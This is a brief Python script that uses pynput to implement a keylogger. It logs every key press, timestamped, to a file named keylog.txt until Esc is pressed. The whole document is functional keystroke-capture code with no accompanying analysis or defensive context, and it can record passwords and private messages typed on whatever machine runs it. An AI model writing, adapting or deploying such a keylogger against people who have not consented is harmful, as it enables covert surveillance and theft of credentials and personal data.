from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(
    filename=("keylog.txt"), 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()